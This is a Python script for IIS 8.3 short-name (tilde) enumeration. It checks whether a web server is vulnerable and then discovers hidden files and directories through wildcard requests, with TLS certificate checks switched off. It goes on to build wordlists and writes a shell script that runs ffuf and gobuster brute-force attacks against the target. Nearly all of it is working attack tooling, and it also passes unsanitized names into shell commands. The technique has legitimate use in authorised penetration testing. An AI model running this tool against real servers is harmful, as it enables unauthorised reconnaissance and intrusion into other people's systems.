#!/usr/bin/env python3
# encoding: utf-8
# Enhanced IIS Short Name Scanner with automatic wordlist generation and brute-force commands

import sys
import threading
import time
import ssl
import argparse
import logging
import os
import subprocess
from queue import Queue, Empty
from urllib.parse import urlparse

try:
    import http.client as httplib
except ImportError:
    import httplib

# SSL configuration
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(message)s'
)
logger = logging.getLogger(__name__)


class Scanner(object):
    def __init__(self, target, num_threads=20, timeout=10, output_file=None, verbose=False):
        self.target = target.lower()
        if not self.target.startswith('http'):
            self.target = 'http://%s' % self.target
        
        parsed = urlparse(self.target)
        self.scheme = parsed.scheme
        self.netloc = parsed.netloc
        self.path = parsed.path
        
        if self.path[-1:] != '/':
            self.path += '/'
        
        self.alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
        self.files = []
        self.dirs = []
        self.queue = Queue()
        self.lock = threading.Lock()
        self.threads = []
        self.request_method = 'GET'
        self.msg_queue = Queue()
        self.STOP_ME = False
        self.num_threads = num_threads
        self.timeout = timeout
        self.output_file = output_file
        self.verbose = verbose
        self.stats = {'requests': 0, '404': 0, '400': 0, '403': 0}
        
        # File extensions to search for
        self.extensions = [
            '.*',
            '.aspx',
            '.asp',
            '.txt',
            '.bak',
            '.zip',
            '.cs',
            '.config',
            '.xml',
            '.json',
            '.exe',
            '.dll',
            '.log',
            '.sql',
            '.ps1',
            '.bat',
            '.cmd',
            '.conf',
            '.ini',
            '.env',
        ]
        
        # Start message printer thread
        printer_thread = threading.Thread(target=self._print_worker, daemon=True)
        printer_thread.start()

    def _conn(self):
        """Create HTTP/HTTPS connection"""
        try:
            if self.scheme == 'https':
                conn = httplib.HTTPSConnection(self.netloc, timeout=self.timeout)
            else:
                conn = httplib.HTTPConnection(self.netloc, timeout=self.timeout)
            return conn
        except Exception as e:
            logger.debug('[DEBUG] Connection failed: %s' % e)
            return None

    def _get_status(self, path):
        """Get HTTP status code for a path"""
        try:
            conn = self._conn()
            if conn is None:
                return None
            
            conn.request(self.request_method, path)
            response = conn.getresponse()
            status = response.status
            response.read()
            conn.close()
            
            return status
        except Exception as e:
            logger.debug('[DEBUG] Request error: %s' % e)
            return None

    def is_vulnerable(self):
        """Check if server is vulnerable to IIS short name enumeration"""
        try:
            logger.info('[*] Checking for IIS Tilde Enumeration vulnerability...')
            
            for method in ['GET', 'OPTIONS']:
                self.request_method = method
                
                status_1 = self._get_status(self.path + '/*~1*/a.aspx')
                status_2 = self._get_status(self.path + '/l1j1e*~1*/a.aspx')
                
                logger.info('[*] Method %s: exist=%s, non-exist=%s' % (method, status_1, status_2))
                
                if status_1 == 404 and status_2 != 404:
                    logger.info('[+] Server is VULNERABLE using %s method' % method)
                    return True
            
            return False
        except Exception as e:
            logger.error('[ERROR] Vulnerability check failed: %s' % e)
            return False

    def _scan_worker(self):
        """Worker thread for enumeration"""
        while True:
            try:
                url, ext = self.queue.get(timeout=1.0)
            except Empty:
                break
            except Exception as e:
                logger.debug('[DEBUG] Queue error: %s' % e)
                break

            try:
                test_path = url + '*~1' + ext + '/1.aspx'
                status = self._get_status(test_path)
                
                if status is None:
                    continue
                
                with self.lock:
                    self.stats['requests'] += 1
                    if status == 404:
                        self.stats['404'] += 1
                    elif status == 400:
                        self.stats['400'] += 1
                    elif status == 403:
                        self.stats['403'] += 1
                
                # Check for match (404)
                if status == 404:
                    if self.verbose:
                        self.msg_queue.put('[+] %s~1%s\t[HTTP %s]' % (url, ext, status))
                    
                    # Continue enumeration if path is short enough
                    if len(url) - len(self.path) < 6:
                        for c in self.alphanum:
                            self.queue.put((url + c, ext))
                    else:
                        # Finalize detection
                        if ext == '.*':
                            self.queue.put((url, ''))
                        elif ext == '':
                            with self.lock:
                                self.dirs.append(url + '~1')
                            self.msg_queue.put('[+] Directory: %s~1' % url)
                            
                            # Search inside directory
                            for c in self.alphanum:
                                for ext_inner in self.extensions:
                                    self.queue.put((url + '/' + c, ext_inner))
                        
                        elif len(ext) == 5 or (not ext.endswith('*')):
                            with self.lock:
                                self.files.append(url + '~1' + ext)
                            self.msg_queue.put('[+] File: %s~1%s' % (url, ext))
                        
                        else:
                            for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
                                self.queue.put((url, ext[:-1] + c + '*'))
                                if len(ext) < 4:
                                    self.queue.put((url, ext[:-1] + c))

            except Exception as e:
                logger.debug('[DEBUG] Worker exception: %s' % e)

    def run(self):
        """Start the scanning process"""
        logger.info('[*] Starting enumeration with %d threads...' % self.num_threads)
        start_time = time.time()
        
        # Initialize queue with single characters and different extensions
        for c in self.alphanum:
            for ext in self.extensions:
                self.queue.put((self.path + c, ext))
        
        logger.info('[*] Loaded %d tasks in queue' % self.queue.qsize())
        
        # Start worker threads
        for i in range(self.num_threads):
            t = threading.Thread(target=self._scan_worker)
            self.threads.append(t)
            t.start()
        
        # Wait for all threads to complete
        for t in self.threads:
            t.join()
        
        elapsed = time.time() - start_time
        self.STOP_ME = True
        
        logger.info('[*] Enumeration completed in %.2f seconds' % elapsed)

    def report(self):
        """Print detailed report"""
        time.sleep(0.5)
        
        print('\n' + '='*70)
        print('IIS SHORT NAME ENUMERATION - SCAN REPORT')
        print('='*70)
        
        print('\n[TARGET INFORMATION]')
        print('  URL: %s' % self.target)
        print('  Path: %s' % self.path)
        
        print('\n[SCAN STATISTICS]')
        print('  Total Requests: %d' % self.stats['requests'])
        print('  404 Responses: %d' % self.stats['404'])
        print('  400 Responses: %d' % self.stats['400'])
        print('  403 Responses: %d' % self.stats['403'])
        
        if self.dirs:
            print('\n[DIRECTORIES FOUND] (%d total)' % len(self.dirs))
            print('-'*70)
            for d in sorted(set(self.dirs)):
                print('  Dir:  %s' % d)
        else:
            print('\n[DIRECTORIES FOUND] (0 total)')
        
        if self.files:
            print('\n[FILES FOUND] (%d total)' % len(self.files))
            print('-'*70)
            for f in sorted(set(self.files)):
                print('  File: %s' % f)
        else:
            print('\n[FILES FOUND] (0 total)')
        
        print('\n' + '='*70)
        print('SUMMARY: %d Directories, %d Files found in total' % (len(set(self.dirs)), len(set(self.files))))
        print('='*70)
        print('Note: * is a wildcard that matches any character (0 or more times)')
        print('Note: ~1 represents the DOS 8.3 short name format\n')
        
        if self.output_file:
            self._save_report()

    def _save_report(self):
        """Save report to file"""
        try:
            with open(self.output_file, 'w') as f:
                f.write('IIS SHORT NAME ENUMERATION SCAN REPORT\n')
                f.write('='*70 + '\n\n')
                f.write('Target: %s\n' % self.target)
                f.write('Path: %s\n' % self.path)
                f.write('Scan Time: %s\n\n' % time.strftime('%Y-%m-%d %H:%M:%S'))
                
                f.write('STATISTICS:\n')
                f.write('  Total Requests: %d\n' % self.stats['requests'])
                f.write('  404 Responses: %d\n' % self.stats['404'])
                f.write('  400 Responses: %d\n' % self.stats['400'])
                f.write('  403 Responses: %d\n\n' % self.stats['403'])
                
                f.write('DIRECTORIES (%d found):\n' % len(set(self.dirs)))
                for d in sorted(set(self.dirs)):
                    f.write('  %s\n' % d)
                
                f.write('\nFILES (%d found):\n' % len(set(self.files)))
                for file in sorted(set(self.files)):
                    f.write('  %s\n' % file)
                
                f.write('\n' + '='*70 + '\n')
                f.write('Total: %d directories, %d files\n' % (len(set(self.dirs)), len(set(self.files))))
            
            logger.info('[+] Report saved to %s' % self.output_file)
        except Exception as e:
            logger.error('[ERROR] Failed to save report: %s' % e)

    def _print_worker(self):
        """Dedicated thread for printing messages in order"""
        while not self.STOP_ME or (not self.msg_queue.empty()):
            try:
                msg = self.msg_queue.get(timeout=0.1)
                print(msg)
            except Empty:
                time.sleep(0.05)
            except Exception as e:
                logger.debug('[DEBUG] Print error: %s' % e)

    def generate_wordlists_and_commands(self):
        """Generate wordlists using egrep and create ffuf/gobuster commands"""
        # Create output directory
        output_dir = '/tmp/iis'
        try:
            os.makedirs(output_dir, exist_ok=True)
        except:
            output_dir = '/tmp'
        
        # Extract partial prefixes from found files/directories
        partial_prefixes = set()
        for item in self.files + self.dirs:
            if '~1' in item:
                partial = item.split('/')[-1].split('~1')[0]
                if partial and len(partial) > 0:
                    partial_prefixes.add(partial)
        
        if not partial_prefixes:
            logger.warning('[!] No partial names found for brute-forcing')
            return
        
        print('\n' + '='*80)
        print('WORDLIST GENERATION & BRUTE-FORCE SETUP')
        print('='*80)
        
        # Generate wordlists from system dictionaries
        generated_files = {}
        logger.info('[*] Generating wordlists from system dictionaries...')
        
        for prefix in sorted(partial_prefixes):
            output_file = os.path.join(output_dir, '%s.txt' % prefix)
            
            # Execute egrep command
            cmd = 'egrep -rih "^%s" /usr/share/wordlists/ 2>/dev/null | sort -u > %s' % (prefix, output_file)
            
            try:
                logger.info('[*] Extracting words for prefix: %s' % prefix)
                subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
                
                # Check if file was created and has content
                if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                    with open(output_file, 'r') as f:
                        lines = len(f.readlines())
                    print('[+] Generated: %s (%d words)' % (output_file, lines))
                    generated_files[prefix] = output_file
                else:
                    logger.warning('[!] No results for prefix: %s' % prefix)
                    if os.path.exists(output_file):
                        os.remove(output_file)
            except Exception as e:
                logger.debug('[DEBUG] egrep failed for %s: %s' % (prefix, e))
        
        if not generated_files:
            logger.error('[!] Failed to generate any wordlists')
            return
        
        # Combine all wordlists
        combined_wordlist = os.path.join(output_dir, 'combined.txt')
        cat_cmd = 'cat %s | sort -u > %s' % (' '.join(sorted(generated_files.values())), combined_wordlist)
        
        print('\n[*] Combining wordlists...')
        subprocess.run(cat_cmd, shell=True, capture_output=True, timeout=30)
        
        if os.path.exists(combined_wordlist):
            combined_lines = len(open(combined_wordlist).readlines())
            print('[+] Combined wordlist: %s (%d words)' % (combined_wordlist, combined_lines))
        
        # Get extensions from found files
        extensions = set()
        for f in self.files:
            if '.' in f:
                ext = f[f.rfind('.'):]
                extensions.add(ext.lstrip('.'))
        
        if not extensions:
            extensions = {'aspx', 'asp', 'txt', 'bak', 'zip'}
        
        extensions_str = ','.join(sorted(extensions))
        
        # Generate commands
        print('\n' + '='*80)
        print('READY-TO-USE BRUTE-FORCE COMMANDS')
        print('='*80)
        
        # FFUF command
        print('\n[FFUF COMMAND]:\n')
        ffuf_cmd = 'ffuf -u "%s/FUZZ" -w %s -e ".%s" -t 50 -o /tmp/iis/ffuf_results.json' % (
            self.target, combined_wordlist, extensions_str.replace(',', ',.')
        )
        print('%s' % ffuf_cmd)
        
        # Gobuster command
        print('\n[GOBUSTER COMMAND]:\n')
        gobuster_cmd = 'gobuster dir -u "%s/" -w %s -x "%s" -t 50 --timeout 10s -o /tmp/iis/gobuster_results.txt' % (
            self.target, combined_wordlist, extensions_str
        )
        print('%s' % gobuster_cmd)
        
        # Save commands to file
        cmd_file = os.path.join(output_dir, 'brute_force_commands.sh')
        try:
            with open(cmd_file, 'w') as f:
                f.write('#!/bin/bash\n')
                f.write('# IIS Tilde Enumeration Brute-Force Commands\n')
                f.write('# Generated by IIS Scanner\n\n')
                f.write('echo "[*] Starting brute-force attacks..."\n\n')
                f.write('# FFUF command\n')
                f.write('echo "[*] Running FFUF..."\n')
                f.write(ffuf_cmd + '\n\n')
                f.write('# Gobuster command\n')
                f.write('echo "[*] Running Gobuster..."\n')
                f.write(gobuster_cmd + '\n')
            
            os.chmod(cmd_file, 0o755)
            print('\n[SAVED TO FILE]: %s' % cmd_file)
            print('\n[EXECUTE]:\n  bash %s' % cmd_file)
        except Exception as e:
            logger.debug('[DEBUG] Failed to save commands: %s' % e)
        
        print('\n' + '='*80 + '\n')


def main():
    parser = argparse.ArgumentParser(
        description='IIS 8.3 Short Name Enumeration Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 scanner.py http://target.com
  python3 scanner.py https://target.com -t 30 --timeout 15
  python3 scanner.py http://192.168.1.1 -o results.txt
  python3 scanner.py http://target.com -t 50 -v
        '''
    )
    
    parser.add_argument('target', help='Target URL (http://target.com or https://target.com)')
    parser.add_argument('-t', '--threads', type=int, default=20, 
                        help='Number of threads (default: 20)')
    parser.add_argument('--timeout', type=int, default=10,
                        help='Request timeout in seconds (default: 10)')
    parser.add_argument('-o', '--output', dest='output_file',
                        help='Output file for results')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output - show all enumeration attempts')
    
    args = parser.parse_args()
    
    scanner = Scanner(args.target, num_threads=args.threads, 
                     timeout=args.timeout, output_file=args.output_file, 
                     verbose=args.verbose)
    
    if not scanner.is_vulnerable():
        scanner.STOP_ME = True
        logger.error('[!] Server does not appear vulnerable to IIS short name enumeration')
        sys.exit(1)
    
    logger.info('[+] Server is vulnerable, starting scan...')
    try:
        scanner.run()
        scanner.report()
        
        # Generate wordlists and brute-force commands
        scanner.generate_wordlists_and_commands()
        
    except KeyboardInterrupt:
        logger.warning('\n[!] Scan interrupted by user')
        scanner.STOP_ME = True
        sys.exit(0)


if __name__ == '__main__':
    main()
